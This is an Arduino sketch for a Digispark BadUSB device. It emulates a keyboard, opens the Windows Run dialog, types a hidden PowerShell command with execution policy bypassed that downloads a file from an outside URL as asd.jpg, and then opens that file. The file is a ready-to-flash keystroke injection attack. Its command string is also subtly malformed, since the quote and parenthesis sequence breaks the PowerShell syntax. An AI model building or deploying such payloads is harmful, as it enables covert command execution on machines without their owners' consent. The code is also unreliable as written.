#include "DigiKeyboard.h"
#define url "https://img.wonderhowto.com/img/original/16/01/63702090080478/0/637020900804781601.jpg"
#define d_adi "asd.jpg"


void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass -Command (new-object System.Net.WebClient).DownloadFile('");
  DigiKeyboard.print(url);
  DigiKeyboard.print("',')");
  DigiKeyboard.print(d_adi);
  DigiKeyboard.println("') ");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.println(d_adi);
}


void loop() {

}
